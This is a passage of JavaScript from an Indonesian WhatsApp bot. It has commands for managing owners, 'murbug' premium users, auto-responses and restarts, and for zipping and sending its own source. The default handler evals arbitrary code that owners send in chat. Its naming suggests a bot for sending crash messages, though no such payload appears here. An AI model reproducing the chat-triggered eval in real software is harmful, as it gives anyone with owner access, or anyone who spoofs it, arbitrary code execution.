if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isOwner) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listmurbug": {
if (premium.length < 1) return m.reply("Tidak ada user Murbug")
let teks = `\n *List Murbug Nika*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
depayy.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "self": {
if (!isOwner) return
depayy.public = false
xreplybugbutton("Berhasil mengganti ke mode *self*")
}
break

case "public": {
if (!isOwner) return
depayy.public = true
xreplybugbutton("Berhasil mengganti ke mode *public*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": {
if (!isOwner) return xreplybugbutton(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return payreply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Wait.....")
var name = `Nika Version 8 By Depay`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await depayy.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return payreply("Script bot berhasil dikirim ke private chat")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isOwner) return payreply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
payreply("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owner.length < 1) return payreply("Tidak ada owner tambahan")
let teks = `\n *List all owner tambahan*\n`
for (let i of owner) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
depayy.sendMessage(m.chat, {text: teks, mentions: owner}, {quoted: lol})
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
 case "addowner": case "addown": {
if (!isOwner) return xreplybugbutton(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (owner2.includes(orang) || orang == global.owner) return xreplybugbutton(`Nomor ${orang.split("@")[0]} Sudah Ada Di Database Owner`)
if (orang == botNumber) return xreplybugbutton("Tidak Bisa Menambahkan Nomor Bot Kedalam Database Owner Tambahan!")
let check = await depayy.onWhatsApp(`${orang.split("@")[0]}`)
if (check.length < 1) return payreply(`Nomor ${orang.split("@")[0]} Tidak Terdaftar Di WhatsApp`)
await owner2.push(orang)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
xreplybugbutton(`*Berhasil Menambah Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Ditambahkan Kedalam Database Owner`)
} else {
payreply(example("@tag/6283XXX"))
}
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "delowner": case "delown": {
if (!isOwner) return xreplybugbutton(msg.owner)
if (m.quoted || text) {
if (text == "all") {
await fs.writeFileSync("./database/owner.json", "[]")
return xreplybugbutton(`*Berhasil Menghapus Semua Owner Tambahan ✅*`)
}
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!owner2.includes(orang) || orang == global.owner) return necroxenreply(`Nomor ${orang.split("@")[0]} Tidak Ada Di Database Owner`)
if (orang == botNumber) return necroxenreply("Tidak Bisa Menghapus Nomor Bot!")
let pos = owner2.indexOf(orang)
await owner2.splice(pos, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
payreply(`*Berhasil Menghapus Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Dihapus Dari Database Owner`)
} else {
payreply(example("@tag/6283XXX"))
}
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "addmurbug": case "addpremium": {
if (!isOwner) return xreplybugbutton(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (premium.includes(orang)) return necroxenreply(`*Gagal Menambah User Premium!*\n${orang.split('@')[0]} Sudah Terdaftar Di Database *User Premium*`)
await premium.push(orang)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
xreplybugbutton(`*Berhasil Menambah Premium ✅*\n${orang.split('@')[0]} Sekarang Terdaftar Di Database *User Premium*`)
} else {
return xreplybugbutton(example("@tag/62838XXX"))
}}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "delmurbug": case "delpremium": {
if (!isOwner) return xreplybugbutton(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!premium.includes(orang)) return xreplybugbutton(`*Gagal Menghapus User Premium!*\n${orang.split('@')[0]} Tidak Terdaftar Di Database *User Premium*`)
let indx = premium.indexOf(orang)
await premium.splice(indx, 1)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
xreplybugbutton(`*Berhasil Menghapus Premium ✅*\n${orang.split('@')[0]} Sekarang Terhapus Dari Database *User Premium*`)
} else {
return xreplybugbutton(example("@tag/62838XXX"))
}}
break

case 'play': {
  if (!isOwner) return xreplybugbutton('khusus owner njrr')
  if (!text) return xreplybugbutton('Masukkan judul lagu!\nContoh: *play Jakarta Hari Ini*');

  try {
    const res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
    if (!res.ok) return m.reply('Gagal mengambil data dari server.');
    const data = await res.json();
    if (!data.status || !data.result) return m.reply('Lagu tidak ditemukan!');
    const { title, channel, duration, imageUrl, link } = data.result.metadata;
    const downloadUrl = data.result.downloadUrl;
    const thumbnail = await (await fetch(imageUrl)).buffer();
    await depayy.sendMessage(m.chat, {
      audio: { url: downloadUrl },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: title,
          body: `${channel} • ${duration}`,
          thumbnail,
          mediaUrl: link,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: link
        }
      }
    }, { quoted: lol });
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan saat memproses permintaanmu.');
  }
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case 'tourl1': {
  try {
    const quoted = m.quoted || m;

    if (!quoted.mtype || !/imageMessage|videoMessage|audioMessage/.test(quoted.mtype)) {
      return m.reply(`⚡︎ Kirim atau reply gambar, video, atau audio dengan caption *${prefix + command}*`);
    }

    const buffer = await quoted.download();
    const fileName = `./tmp-${Date.now()}.jpg`; // opsional: ganti sesuai mime-type
    fs.writeFileSync(fileName, buffer);

    const url = await CatBox(fileName);
    const fileSize = (fs.statSync(fileName).size / 1024).toFixed(2);

    await m.reply(
      `ᴜᴋᴜʀᴀɴ ғɪʟᴇ : ${fileSize} ᴋʙ\nᴘᴇɴɢᴜɴɢɢᴀʜ : ${pushname}\nᴜʀʟ : ${url}`
    );

    fs.unlinkSync(fileName);
  } catch (err) {
    console.error("ERROR:", err);
    m.reply("⚡︎ Terjadi kesalahan saat mengunggah file.");
  }
}
break;


// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'cquote':
case 'createquote': {
 if (!text) return xreplybugbutton(`*Cara pakai fitur Quote:*\n\nKetik:\n*createquote teks | username | tanda tangan | ppUrl*\n\nContoh tanpa ppUrl (otomatis pakai foto profil kamu):\ncreatequote Aku semangat! | Biyu | Official\n\nContoh dengan gambar custom:\ncreatequote Semangat terus! | Biyu | Admin | https:/xxxxxx.jpg`)

 let [isi, usern = '', sign = '', ppUrl = ''] = text.split("|").map(v => v.trim())
 if (!isi) return m.reply('Teks quote tidak boleh kosong.')
 if (!ppUrl) {
 ppUrl = await depayy.profilePictureUrl(m.sender, 'image').catch(() => 'https://files.catbox.moe/idj484.jpg')
 }
 let url = `https://fastrestapis.fasturl.cloud/maker/quote?text=${encodeURIComponent(isi)}&username=${encodeURIComponent(usern)}&ppUrl=${encodeURIComponent(ppUrl)}&signature=${encodeURIComponent(sign)}`
 
 try {
 depayy.sendMessage(m.chat, { image: { url }, caption: "Berhasil dibuat!" }, { quoted: m })
 } catch (e) {
 console.log('Gagal kirim quote:', e)
 xreplybugbutton('Gagal membuat quote, coba lagi nanti.')
 }
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 

default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (m.text.toLowerCase() == "bot") {
   xreplybugbutton(`*NIKA V9 GEN 2 ON!!*`)
}
if (m.text.toLowerCase() == "tes") {
   xreplybugbutton(`*NIKA V9 GEN 2 ON*`)
}


if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
